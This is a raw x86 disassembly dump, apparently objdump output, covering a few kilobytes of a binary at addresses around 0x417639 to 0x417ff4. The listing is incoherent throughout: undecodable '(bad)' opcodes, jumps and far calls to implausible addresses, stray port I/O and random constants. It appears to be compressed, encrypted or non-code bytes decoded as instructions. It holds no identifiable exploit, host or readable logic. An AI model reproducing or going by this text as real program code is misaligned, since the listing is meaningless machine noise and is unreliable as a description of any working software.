  417639:	sbb    DWORD PTR [edi+esi*8-0xb5296d0],edx
  417640:	mov    bl,BYTE PTR [ebx+esi*4]
  417643:	mov    ch,bl
  417645:	add    al,0xcf
  417647:	push   ebx
  417648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417649:	js     0x4176ba
  41764b:	fld    TBYTE PTR [edx-0x6a5d5a60]
  417651:	mov    al,ds:0xd10f5b04
  417656:	sbb    DWORD PTR [edi],ecx
  417658:	adc    al,0xe7
  41765a:	daa    
  41765b:	lock mov WORD PTR [eax+0x73],ds
  41765f:	mov    ch,0xfe
  417661:	test   DWORD PTR [eax],eax
  417663:	xor    BYTE PTR [edx-0x4c2172fd],dl
  417669:	add    BYTE PTR [ebp+0x6960d121],0xf5
  417670:	pop    DWORD PTR [edi-0x24ab9ce4]
  417676:	test   al,0x2
  417678:	xor    ch,dl
  41767a:	retf   0xdfc0
  41767d:	je     0x4176f3
  41767f:	pop    ebp
  417680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417681:	cli    
  417682:	(bad)  
  417684:	ins    DWORD PTR es:[edi],dx
  417685:	mov    eax,0x5b6a5b53
  41768a:	add    bh,BYTE PTR [edi-0x17081694]
  417690:	dec    esi
  417691:	in     al,0x92
  417693:	call   0xeb2eb0e3
  417698:	and    edi,eax
  41769a:	cmp    BYTE PTR [ecx+0x22d17ce1],cl
  4176a0:	retf   
  4176a1:	mov    WORD PTR [esi+0x7e],es
  4176a4:	or     al,0xc9
  4176a6:	add    DWORD PTR [eax+0x50],eax
  4176a9:	dec    esp
  4176aa:	ret    
  4176ab:	or     eax,0x96ead54c
  4176b0:	sbb    al,0x35
  4176b2:	dec    esp
  4176b3:	lds    ecx,FWORD PTR [edx+0x4b75423c]
  4176b9:	je     0x417640
  4176bb:	push   ecx
  4176bc:	in     al,0xf9
  4176be:	call   0x5f41f76a
  4176c3:	pop    ds
  4176c4:	mov    eax,0x19c4d8db
  4176c9:	mov    al,0x91
  4176cb:	add    ch,0x47
  4176ce:	sbb    DWORD PTR [ecx+edx*4-0x13],ecx
  4176d2:	push   ds
  4176d3:	dec    ebx
  4176d4:	or     al,0x81
  4176d6:	xchg   esp,eax
  4176d7:	sbb    BYTE PTR [esi-0x2b],dl
  4176da:	popa   
  4176db:	or     DWORD PTR [edi],ecx
  4176dd:	pop    ecx
  4176de:	lods   al,BYTE PTR ds:[si]
  4176e0:	out    0xa5,eax
  4176e2:	mov    bh,0x59
  4176e4:	dec    ebx
  4176e5:	std    
  4176e6:	gs cmc 
  4176e8:	pop    es
  4176e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176ea:	mov    ds:0x4c7f36fd,al
  4176ef:	call   0xbd7d4c15
  4176f4:	cs std 
  4176f6:	(bad)  
  4176f7:	lods   al,BYTE PTR ds:[esi]
  4176f8:	or     ebx,DWORD PTR ds:0x43e11fc4
  4176fe:	fldenv [edx+0x4651da0c]
  417704:	sub    ecx,DWORD PTR [eax-0x41]
  417707:	das    
  417708:	sbb    eax,0xae731f5f
  41770d:	(bad)  
  41770e:	shl    DWORD PTR [esi],1
  417710:	stos   BYTE PTR es:[edi],al
  417711:	pop    ss
  417712:	push   edx
  417713:	push   ds
  417714:	add    bh,BYTE PTR [esi]
  417716:	(bad)  
  417717:	or     BYTE PTR [esi],ch
  417719:	mov    ch,0xd5
  41771b:	push   esi
  41771c:	mov    eax,0xbd6f54ec
  417721:	jmp    0x41773c
  417723:	jnp    0x4176ad
  417725:	shl    BYTE PTR [esi],cl
  417727:	dec    edx
  417728:	(bad)  
  417729:	outs   dx,DWORD PTR ds:[esi]
  41772a:	jae    0x4176bd
  41772c:	std    
  41772d:	mov    BYTE PTR [edx],al
  41772f:	push   ds
  417730:	sbb    dl,ch
  417732:	jne    0x41775e
  417734:	push   esp
	...
  417795:	add    cl,ch
  417797:	push   cs
  417798:	(bad)  
  417799:	pop    ss
  41779a:	push   edi
  41779c:	jmp    0xebcb2f9f
  4177a1:	sbb    DWORD PTR [edx-0x865d1c4],ebx
  4177a7:	cmc    
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [edi-0x16faad86],al
  4177b3:	jb     0x4177b0
  4177b5:	dec    esp
  4177b6:	cmc    
  4177b7:	retf   0xba32
  4177ba:	mov    edi,0xa6f81eea
  4177bf:	dec    edi
  4177c0:	mov    dh,0xae
  4177c2:	das    
  4177c3:	jle    0x417784
  4177c5:	sub    cl,al
  4177c7:	adc    al,0x6d
  4177c9:	and    edx,DWORD PTR [eax-0x1]
  4177cc:	loopne 0x4177a5
  4177ce:	icebp  
  4177cf:	xchg   edx,eax
  4177d0:	jb     0x417791
  4177d2:	jecxz  0x417807
  4177d4:	(bad)  
  4177d5:	in     eax,0xda
  4177d7:	and    al,0x21
  4177d9:	enter  0xcd93,0x18
  4177dd:	inc    ecx
  4177de:	or     al,0x37
  4177e0:	mov    dh,0x58
  4177e2:	aam    0x6c
  4177e4:	int    0xae
  4177e6:	clc    
  4177e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e8:	mov    eax,DWORD PTR [ebp+0x6c6d6f33]
  4177ee:	loopne 0x41783e
  4177f0:	sub    BYTE PTR [edi-0x1d],ch
  4177f3:	movsx  ebp,BYTE PTR [eax+edi*8]
  4177f7:	mov    ds:0x6f1ff26e,eax
  4177fc:	outs   dx,BYTE PTR ds:[esi]
  4177fd:	repz gs jno 0x41778b
  417801:	inc    ecx
  417802:	fcomp  DWORD PTR [eax]
  417804:	clc    
  417805:	lods   eax,DWORD PTR ds:[esi]
  417806:	adc    DWORD PTR [ebp+eiz*2-0x48465349],0x93717ab1
  417811:	push   ebx
  417812:	test   edx,edi
  417814:	ficomp WORD PTR [ebx-0x60691709]
  41781a:	cld    
  41781b:	lods   eax,DWORD PTR ds:[esi]
  41781c:	jne    0x417885
  41781e:	xor    ebp,esp
  417820:	out    0x4f,al
  417822:	cmc    
  417823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417824:	push   es
  417825:	xchg   ecx,eax
  417826:	ja     0x417847
  417828:	mov    eax,ds:0x287618b9
  41782d:	shl    DWORD PTR [ebp+0x2],1
  417830:	adc    eax,0x80496d77
  417835:	push   eax
  417836:	add    ecx,edi
  417838:	xchg   ebx,eax
  417839:	or     al,bl
  41783b:	daa    
  41783c:	add    esi,DWORD PTR [eax+0x20]
  41783f:	pop    eax
  417840:	mov    ebx,DWORD PTR [eax+ecx*4]
  417843:	or     edi,DWORD PTR [edx-0xd5d368d]
  417849:	test   eax,0xedf946bd
  41784e:	or     ah,cl
  417850:	mov    ah,0x84
  417852:	enter  0x89b6,0x68
  417856:	gs push ebp
  417858:	push   esp
  417859:	enter  0xfead,0x38
  41785d:	push   esi
  41785e:	dec    esp
  41785f:	cmp    eax,esi
  417861:	cmp    al,0xb0
  417863:	or     DWORD PTR [edi-0x1f],esp
  417866:	lds    ecx,FWORD PTR [esi+0x3c93cd8a]
  41786c:	xor    dl,BYTE PTR [ebp-0x4688311c]
  417872:	in     eax,0xa2
  417874:	add    esp,DWORD PTR [ebp+0x0]
  417877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417878:	repz pop esi
  41787a:	aas    
  41787b:	ret    
  41787c:	iret   
  41787d:	(bad)  
  41787e:	in     al,dx
  41787f:	jle    0x417888
  417881:	pop    edi
  417882:	mov    DWORD PTR [ebx],ecx
  417884:	jle    0x4178e5
  417886:	test   DWORD PTR [edx],ebx
  417888:	xchg   edx,eax
  417889:	int    0x8d
  41788b:	pop    es
  41788c:	adc    DWORD PTR [edi],ebx
  41788e:	fnstsw WORD PTR [eax-0x5e60052e]
  417894:	aas    
  417895:	fisttp WORD PTR [esi-0x63]
  417898:	enter  0x8a71,0xe4
  41789c:	pop    eax
  41789d:	inc    esp
  41789e:	rcl    BYTE PTR [eax+0x24],0xea
  4178a2:	mov    ah,0xfc
  4178a4:	mov    ebp,0xe1a72021
  4178a9:	push   esi
  4178aa:	push   0xd15e5b82
  4178af:	stc    
  4178b0:	ret    
  4178b1:	aad    0x6e
  4178b3:	outs   dx,BYTE PTR ds:[esi]
  4178b4:	aam    0x0
	...
  417916:	pop    eax
  417917:	inc    ecx
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0xe960e3bb
  417923:	and    eax,0xf6fef4c9
  417928:	add    BYTE PTR [eax],al
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [edi+0x30],al
  417930:	pop    ds
  417931:	or     DWORD PTR [ebp+0x387a5c1e],edi
  417937:	pop    ebx
  417938:	test   BYTE PTR [esi-0x3c10f376],dl
  41793e:	scas   al,BYTE PTR es:[edi]
  41793f:	addr16 pop edx
  417941:	ja     0x4178c6
  417943:	sbb    al,0x96
  417945:	lock lahf 
  417947:	repnz push edi
  417949:	xor    DWORD PTR [edi-0x7f],0x5fc141c2
  417950:	in     eax,dx
  417951:	mov    gs,WORD PTR [edx+0x4b0c1c7a]
  417957:	jns    0x417953
  417959:	and    al,ah
  41795b:	inc    ebx
  41795c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41795d:	imul   ebx,esp,0x1139589c
  417963:	mov    ah,0xaa
  417965:	cli    
  417966:	xor    eax,0x50fc0b8e
  41796b:	cld    
  41796c:	bound  esi,QWORD PTR [edx+0x43]
  41796f:	sbb    BYTE PTR [edi-0x47723b7e],bh
  417975:	sbb    BYTE PTR [ebp-0x1efa294b],0x8f
  41797c:	nop    DWORD PTR [edx-0x51]
  417980:	(bad)  [edx-0x32]
  417983:	xchg   esp,eax
  417984:	out    dx,eax
  417985:	stos   DWORD PTR es:[edi],eax
  417986:	jg     0x417956
  417988:	adc    esp,DWORD PTR [ecx+0x546de905]
  41798e:	pop    DWORD PTR [edx]
  417990:	sbb    esi,esp
  417992:	push   0x3f
  417994:	xchg   ebx,eax
  417995:	pop    esp
  417996:	inc    eax
  417997:	fild   QWORD PTR [ebp-0x6c5de1f]
  41799d:	pop    edx
  41799e:	push   edx
  41799f:	enter  0xef1d,0x8f
  4179a3:	push   ss
  4179a4:	sbb    ebp,ebp
  4179a6:	mov    eax,ds:0x7141b8c8
  4179ab:	in     eax,0xf9
  4179ad:	ss jp  0x4179ea
  4179b0:	ret    
  4179b1:	xbegin 0x89e7380d
  4179b7:	sub    ebx,DWORD PTR [esi]
  4179b9:	jle    0x417986
  4179bb:	pusha  
  4179bc:	mov    eax,ds:0xa2d163e7
  4179c1:	inc    ecx
  4179c2:	shl    DWORD PTR [ebx+0x68],1
  4179c5:	jp     0x4179a1
  4179c7:	and    DWORD PTR [ecx],ebp
  4179c9:	xor    al,0xea
  4179cb:	pop    ebx
  4179cc:	jb     0x41798c
  4179ce:	mov    al,ds:0x1967882f
  4179d3:	push   ss
  4179d4:	enter  0xc142,0xb6
  4179d8:	mov    ecx,ebp
  4179da:	pop    edi
  4179db:	inc    esi
  4179dc:	pop    ds
  4179dd:	mov    ds:0xc584c045,al
  4179e2:	push   ecx
  4179e3:	push   edi
  4179e4:	aam    0x73
  4179e6:	dec    esp
  4179e7:	pop    edi
  4179e8:	mov    bl,0x40
  4179ea:	cmp    dh,0x48
  4179ed:	push   eax
  4179ee:	jmp    0x33dc:0x1666e499
  4179f5:	lahf   
  4179f6:	or     edx,ebx
  4179f8:	jns    0x417a2d
  4179fa:	mov    al,0x5a
  4179fc:	sbb    DWORD PTR [ebx],esi
  4179fe:	(bad)  
  4179ff:	stos   BYTE PTR es:[edi],al
  417a00:	fisttp DWORD PTR [edi+0x12]
  417a03:	iret   
  417a04:	jbe    0x4179f9
  417a06:	test   al,0x28
  417a08:	mov    ecx,0x3b4e134a
  417a0d:	mov    ebx,0x1fedf87e
  417a12:	mov    ebp,0xd85f4e13
  417a17:	stc    
  417a18:	xor    al,0xa8
  417a1a:	xchg   esp,eax
  417a1b:	leave  
  417a1c:	call   0x4b8cda32
  417a21:	test   eax,0xa72a87ca
  417a26:	scas   al,BYTE PTR es:[edi]
  417a27:	lods   al,BYTE PTR ds:[esi]
  417a28:	sub    eax,0xd2b70d92
  417a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a2e:	lods   eax,DWORD PTR ds:[esi]
  417a2f:	jo     0x417a91
  417a31:	add    ah,dl
  417a33:	loopne 0x417aa9
	...
  417a95:	add    BYTE PTR [edi],ch
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx+0x52]
  417aa3:	es and al,0x92
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    BYTE PTR [edi],ch
  417aaf:	inc    edi
  417ab0:	jne    0x417aef
  417ab2:	pop    edx
  417ab3:	mov    eax,0x7ccb21ad
  417ab8:	ret    0xce52
  417abb:	sbb    al,0x2e
  417abd:	pusha  
  417abe:	mov    eax,0xb119c4f0
  417ac3:	jne    0x417a9e
  417ac5:	clc    
  417ac6:	pop    esp
  417ac7:	sub    DWORD PTR [edx+0x66d4cefa],0xffffff86
  417ace:	outs   dx,BYTE PTR ds:[esi]
  417acf:	pop    eax
  417ad0:	rcr    BYTE PTR [edx+0x61],1
  417ad3:	jmp    0x417b0e
  417ad5:	loopne 0x417b25
  417ad7:	mov    al,0xfd
  417ad9:	mov    cl,0x83
  417adb:	cmp    DWORD PTR [eax+ebp*1],ebx
  417ade:	xor    edi,eax
  417ae0:	jne    0x417ab6
  417ae2:	jle    0x417b06
  417ae4:	(bad)  
  417ae5:	lods   al,BYTE PTR ds:[esi]
  417ae6:	pop    es
  417ae7:	dec    edi
  417ae8:	push   edi
  417ae9:	mov    edx,0xda75e27
  417aee:	(bad)  
  417aef:	fcomp  DWORD PTR [edi-0x47]
  417af2:	xchg   ebx,eax
  417af3:	scas   al,BYTE PTR es:[edi]
  417af4:	dec    ebp
  417af5:	fstp   QWORD PTR ds:0x226001f
  417afb:	je     0x417a92
  417afd:	or     al,0xf1
  417aff:	jno    0x417ae9
  417b01:	imul   esp,edi,0x44
  417b04:	cld    
  417b05:	jg     0x417b84
  417b07:	push   es
  417b08:	jns    0x417a96
  417b0a:	jmp    0xc2b7984
  417b0f:	mov    bh,0xb4
  417b11:	ds out dx,al
  417b13:	outs   dx,DWORD PTR ds:[esi]
  417b14:	outs   dx,DWORD PTR ds:[esi]
  417b15:	ja     0x417b19
  417b17:	loope  0x417b17
  417b19:	inc    edx
  417b1a:	pop    eax
  417b1b:	pop    eax
  417b1c:	mov    edi,0xaa7c923e
  417b21:	dec    ecx
  417b22:	cmp    al,0xe
  417b24:	lahf   
  417b25:	sbb    esi,DWORD PTR [esi+0x3d5031b2]
  417b2b:	push   ebp
  417b2c:	jge    0x417b8d
  417b2e:	scas   al,BYTE PTR es:[edi]
  417b2f:	clc    
  417b30:	outs   dx,BYTE PTR ds:[esi]
  417b31:	test   cl,dl
  417b33:	sbb    BYTE PTR [ebx-0x15],cl
  417b36:	mov    al,0xbd
  417b38:	xchg   ch,cl
  417b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b3b:	js     0x417ba4
  417b3d:	jle    0x417ba1
  417b3f:	add    eax,0xae6b273
  417b44:	xchg   BYTE PTR [ebx+0x21d6e87b],dh
  417b4a:	(bad)  
  417b4b:	lock lds esp,FWORD PTR [edi+0x4b4d2f8f]
  417b52:	shl    DWORD PTR [edi+0x78da2b09],1
  417b58:	or     al,0x52
  417b5a:	inc    esi
  417b5b:	mov    dh,0xf9
  417b5d:	xchg   edi,eax
  417b5e:	scas   al,BYTE PTR es:[edi]
  417b5f:	cmp    BYTE PTR [ebx],al
  417b61:	mov    bl,0x7d
  417b63:	stc    
  417b64:	stc    
  417b65:	or     bh,BYTE PTR [ebp+eax*4+0x7ce9acc]
  417b6c:	icebp  
  417b6d:	inc    ecx
  417b6e:	xchg   BYTE PTR [eax+0x70667649],dl
  417b74:	jmp    0x4045b9ec
  417b79:	dec    esi
  417b7a:	cmc    
  417b7b:	or     DWORD PTR [edx-0x72],esi
  417b7e:	xchg   ebx,eax
  417b7f:	sbb    BYTE PTR [ecx-0x1a03d9ba],cl
  417b85:	mov    dl,0x88
  417b87:	push   0xffffffa3
  417b89:	push   0x1e772205
  417b8e:	jb     0x417b93
  417b90:	(bad)  
  417b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b92:	dec    esp
  417b93:	fisub  WORD PTR [edx-0x3f266f3a]
  417b99:	repnz outs dx,BYTE PTR ds:[esi]
  417b9b:	into   
  417b9c:	jae    0x417bca
  417b9e:	shl    DWORD PTR [edx+0x2fa476db],0x31
  417ba5:	sbb    dh,BYTE PTR [ebx+eax*1+0x63]
  417ba9:	stos   DWORD PTR es:[edi],eax
  417baa:	aas    
  417bab:	pop    esp
  417bac:	loopne 0x417bb4
  417bae:	call   0xcede:0xbcb55ed9
	...
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xc2
  417c23:	or     al,0x7e
  417c25:	les    ecx,FWORD PTR [ecx+edi*8]
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [ecx+0x5a731e84],dh
  417c33:	pop    sp
  417c35:	inc    esp
  417c36:	xchg   esp,eax
  417c37:	mov    dl,0x24
  417c39:	xor    DWORD PTR [ecx+0x8],ebx
  417c3c:	cmp    esp,DWORD PTR [ecx+0x9]
  417c3f:	fldcw  WORD PTR ds:0xa62b3d01
  417c45:	inc    edi
  417c46:	cs pop es
  417c48:	inc    esi
  417c49:	jb     0x417c49
  417c4b:	xchg   BYTE PTR [esi-0x7d],al
  417c4e:	xchg   ecx,eax
  417c4f:	outs   dx,DWORD PTR ds:[esi]
  417c50:	mov    dl,0x62
  417c52:	adc    DWORD PTR [ebx+0x5ac4f0e9],edx
  417c58:	and    ch,bh
  417c5a:	fs jne 0x417bef
  417c5d:	pop    ebx
  417c5e:	pop    ds
  417c5f:	inc    esp
  417c61:	out    dx,al
  417c62:	adc    DWORD PTR [edx],esi
  417c64:	repz xchg ebp,eax
  417c66:	mov    esi,0x31652e10
  417c6b:	daa    
  417c6c:	dec    esi
  417c6d:	sbb    edi,eax
  417c6f:	jl     0x417cd5
  417c71:	dec    ebx
  417c72:	inc    edi
  417c73:	push   ss
  417c74:	mov    esp,0x9a5af0ef
  417c79:	xchg   DWORD PTR [edx],ebp
  417c7b:	clc    
  417c7c:	iret   
  417c7d:	scas   al,BYTE PTR es:[edi]
  417c7e:	dec    ebx
  417c7f:	cmp    BYTE PTR [ebx-0x3a],al
  417c82:	(bad)  
  417c83:	loope  0x417c6e
  417c85:	push   es
  417c86:	or     ebp,ecx
  417c88:	imul   ebp,DWORD PTR [edi],0xffffffc0
  417c8b:	lods   eax,DWORD PTR ds:[esi]
  417c8c:	std    
  417c8d:	or     eax,0xe5332020
  417c92:	cmp    BYTE PTR ds:0x9c8d8cc5,dl
  417c98:	mov    al,ds:0xb6cea068
  417c9d:	dec    esp
  417c9e:	ss test edx,esi
  417ca1:	xchg   esi,eax
  417ca2:	jle    0x417cb7
  417ca4:	daa    
  417ca5:	pop    es
  417ca6:	lahf   
  417ca7:	jae    0x417cf7
  417ca9:	and    ebp,DWORD PTR [ebp+0x19460192]
  417caf:	inc    ebx
  417cb0:	adc    DWORD PTR [esi-0x60a6cffb],0xc6c9445c
  417cba:	jmp    0x5058e15f
  417cbf:	cli    
  417cc0:	jb     0x417d40
  417cc2:	(bad)
  417cc6:	js     0x417d28
  417cc8:	stos   DWORD PTR es:[edi],eax
  417cc9:	jge    0x417c58
  417ccb:	repz in eax,dx
  417ccd:	add    al,0x53
  417ccf:	arpl   bx,di
  417cd1:	inc    DWORD PTR cs:[ebx+0x13]
  417cd5:	dec    edi
  417cd6:	xchg   edi,eax
  417cd7:	cwde   
  417cd8:	xor    eax,DWORD PTR [ebp-0x67]
  417cdb:	push   0x626093a
  417ce0:	inc    ebx
  417ce1:	add    ebp,DWORD PTR [esi+0x18990f73]
  417ce7:	cs adc al,0xbf
  417cea:	fwait
  417ceb:	sbb    al,0x7b
  417ced:	push   ecx
  417cee:	inc    esi
  417cef:	ret    0x9196
  417cf2:	mov    ds,WORD PTR [edx-0x43fe5d5e]
  417cf8:	repz shl BYTE PTR [edx],1
  417cfb:	sti    
  417cfc:	cmp    al,0xd3
  417cfe:	sti    
  417cff:	mov    ebx,0x379e3f4c
  417d04:	das    
  417d05:	pop    eax
  417d06:	sub    BYTE PTR [si-0x40],0x10
  417d0b:	fisttp DWORD PTR [esi]
  417d0d:	dec    ecx
  417d0e:	bound  ebp,QWORD PTR [ebx]
  417d10:	je     0x417d04
  417d12:	mov    ds:0x6e0091c3,eax
  417d17:	pop    ss
  417d18:	lds    ebx,FWORD PTR [eax-0x14f93cba]
  417d1e:	pop    esp
  417d1f:	dec    esi
  417d20:	sbb    ebx,esi
  417d22:	sbb    ebp,ebp
  417d24:	sar    BYTE PTR [ebp-0x614500fa],1
  417d2a:	mov    cl,al
  417d2c:	jne    0x417d2e
  417d2e:	mov    ah,0x45
  417d30:	cmp    BYTE PTR [edx+0xdbbd37],0x0
	...
  417d93:	add    BYTE PTR [eax],al
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x2d
  417da3:	pop    ebx
  417da4:	or     esi,DWORD PTR [esi+0xfa13]
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    BYTE PTR [esi+eiz*4+0x13867935],bh
  417db4:	add    bl,bh
  417db6:	push   0xffffffc9
  417db8:	xlat   BYTE PTR ds:[ebx]
  417db9:	scas   eax,DWORD PTR es:[edi]
  417dba:	enter  0x1ca2,0x70
  417dbe:	fldcw  WORD PTR [ebx-0x6f]
  417dc1:	daa    
  417dc2:	sbb    eax,0x4830e8cc
  417dc7:	adc    BYTE PTR [esi],al
  417dc9:	(bad)  
  417dca:	dec    esp
  417dcb:	das    
  417dcc:	or     eax,0xfb8cb630
  417dd1:	setae  BYTE PTR [ecx+0x62b6cf29]
  417dd8:	add    eax,0xaca524d1
  417ddd:	stos   BYTE PTR es:[edi],al
  417dde:	fwait
  417ddf:	mov    bl,0x47
  417de1:	adc    BYTE PTR ds:0xb90af5e1,bl
  417de7:	jb     0x417d99
  417de9:	cdq    
  417dea:	xor    eax,0x956ca46
  417def:	sub    DWORD PTR [ebp-0x458d3b97],0x3d
  417df6:	xchg   ebp,eax
  417df7:	or     eax,0x7cd69640
  417dfc:	jmp    0x894c4b38
  417e01:	inc    edx
  417e02:	inc    edi
  417e03:	ror    BYTE PTR [ebx+esi*8],0x5d
  417e07:	test   eax,0xbf291090
  417e0c:	jg     0x417e25
  417e0e:	ret    
  417e0f:	cmp    edx,DWORD PTR [edi+0x76dc6bd9]
  417e15:	or     DWORD PTR [esi-0x43],eax
  417e18:	sbb    cl,BYTE PTR [eax]
  417e1a:	mov    ds:0x181b1ed,eax
  417e1f:	push   edi
  417e20:	xor    BYTE PTR [ebx],cl
  417e22:	jns    0x417ea0
  417e24:	jns    0x417e9c
  417e26:	add    BYTE PTR [esi+ecx*2-0x6b],0x59
  417e2b:	pop    eax
  417e2c:	add    bh,BYTE PTR [edi-0x53915e3b]
  417e32:	mov    DWORD PTR [edx+edx*1],ebp
  417e35:	mov    esi,0x543b150e
  417e3a:	sub    ebx,DWORD PTR [ebx-0x6de2c15b]
  417e40:	lahf   
  417e41:	xor    ah,cl
  417e43:	jbe    0x417ebf
  417e45:	mov    ebx,0x84758477
  417e4a:	dec    DWORD PTR [ecx-0x60]
  417e4d:	test   DWORD PTR [edi-0x8],eax
  417e50:	mov    WORD PTR [eax-0xdc1a567],?
  417e56:	or     al,0x72
  417e58:	dec    esp
  417e59:	sub    ebx,edx
  417e5b:	(bad)  
  417e5c:	dec    ebx
  417e5d:	push   0x2
  417e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e60:	out    dx,eax
  417e61:	popf   
  417e62:	xchg   esi,eax
  417e63:	sub    bl,BYTE PTR [ebx*2-0x7e736a5b]
  417e6a:	or     BYTE PTR [ebx-0x46],ah
  417e6d:	ins    BYTE PTR es:[edi],dx
  417e6e:	sar    DWORD PTR [edi-0x3],1
  417e71:	cmc    
  417e72:	loope  0x417e82
  417e74:	mov    ds:0x11c5f21f,al
  417e79:	aam    0x77
  417e7b:	int    0x3b
  417e7d:	xlat   BYTE PTR ds:[ebx]
  417e7e:	fwait
  417e7f:	sar    DWORD PTR [esi],cl
  417e81:	xchg   ebp,eax
  417e82:	push   esp
  417e83:	sar    DWORD PTR [eax],1
  417e85:	repz push es
  417e87:	dec    ebx
  417e88:	or     esp,edi
  417e8a:	outs   dx,DWORD PTR ds:[esi]
  417e8b:	dec    ebx
  417e8c:	enter  0xe868,0x4d
  417e90:	fldln2 
  417e92:	mov    ecx,0x7b360d90
  417e97:	mov    dl,0x37
  417e99:	shl    ch,0xc4
  417e9c:	aas    
  417e9d:	aas    
  417e9e:	xchg   BYTE PTR [ecx],dl
  417ea0:	or     DWORD PTR [ebx-0x1a],edx
  417ea3:	enter  0x69ac,0x9
  417ea7:	cmp    dh,BYTE PTR [edx+0x7]
  417eaa:	sub    BYTE PTR [ebx],cl
  417eac:	(bad)  
  417ead:	in     al,0x9a
  417eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eb0:	sub    DWORD PTR [ebx],0x7d6b09
	...
  417f16:	(bad)  
  417f17:	out    0xe6,al
  417f19:	cmp    esp,esi
  417f1b:	cmp    edi,edi
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	jp     0x417f05
  417f24:	xor    edi,DWORD PTR [edi+0x1a]
  417f27:	sti    
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [edi+0x16],al
  417f30:	jb     0x417ecf
  417f32:	xchg   esi,eax
  417f33:	or     dh,bl
  417f35:	call   0x6b80:0x6c67e11b
  417f3c:	jno    0x417f45
  417f3e:	and    cl,BYTE PTR [ecx-0x62]
  417f41:	sbb    al,0xb8
  417f43:	mov    ds:0xae4d3588,al
  417f48:	ins    DWORD PTR es:[edi],dx
  417f49:	icebp  
  417f4a:	mov    al,ds:0x68a3b8f4
  417f4f:	add    al,0xc0
  417f51:	xchg   edx,eax
  417f52:	fwait
  417f53:	aas    
  417f54:	jne    0x417f1d
  417f56:	ret    0x15b4
  417f59:	xchg   ebp,eax
  417f5a:	dec    ebp
  417f5b:	jb     0x417ee7
  417f5d:	xchg   DWORD PTR [ebp-0x42],esi
  417f60:	js     0x417ef3
  417f62:	inc    edx
  417f63:	inc    edx
  417f64:	adc    ecx,esi
  417f66:	aad    0x7e
  417f68:	(bad)  
  417f69:	daa    
  417f6a:	out    dx,eax
  417f6b:	mov    bh,0xe3
  417f6d:	mov    es,ebp
  417f6f:	jmp    0x6990:0xa44d2a3b
  417f76:	push   edi
  417f77:	and    eax,0x375d5aab
  417f7c:	ins    DWORD PTR es:[edi],dx
  417f7d:	lods   eax,DWORD PTR ds:[esi]
  417f7e:	jmp    0x417fac
  417f80:	sbb    eax,0x992aed05
  417f85:	les    edx,FWORD PTR [edx]
  417f87:	hlt    
  417f88:	in     eax,dx
  417f89:	mov    cl,0x9a
  417f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f8c:	cmp    al,0x71
  417f8e:	jbe    0x417f76
  417f90:	jge    0x417fe1
  417f92:	retf   
  417f93:	push   es
  417f94:	scas   eax,DWORD PTR es:[edi]
  417f95:	data16 jb 0x417f8c
  417f98:	addr16 addr16 in al,0xaf
  417f9c:	sbb    BYTE PTR [esi+0x5d204ea8],ch
  417fa2:	aad    0xce
  417fa4:	enter  0x32e8,0xb9
  417fa8:	cmp    BYTE PTR [edi-0x3f2f6a6b],bl
  417fae:	add    esp,ebx
  417fb0:	inc    ebx
  417fb1:	rcl    DWORD PTR [ebx-0x7da0cfdc],0xe8
  417fb8:	stos   BYTE PTR es:[edi],al
  417fb9:	in     eax,dx
  417fba:	loopne 0x417f8c
  417fbc:	xor    ecx,DWORD PTR [esi+0x448cb82a]
  417fc2:	sub    BYTE PTR [esi+0x5f],0x48
  417fc6:	imul   edi,DWORD PTR [ebx+eiz*1+0x7a60c7e9],0xf0896e2a
  417fd1:	mov    ch,BYTE PTR [edi]
  417fd3:	push   es
  417fd4:	or     ecx,DWORD PTR [edi+0x5e]
  417fd7:	and    eax,DWORD PTR [esi-0x12]
  417fda:	fistp  DWORD PTR [edi+edx*4-0x26f4025a]
  417fe1:	mov    ebp,0xf5fd9f21
  417fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fe7:	push   ds
  417fe8:	jb     0x417fc8
  417fea:	mov    esp,0x4f9767d9
  417fef:	cdq    
  417ff0:	aas    
  417ff1:	or     dh,cl
  417ff3:	scas   eax,DWORD PTR es:[edi]
  417ff4:	sbb    eax,0x5903bfe1
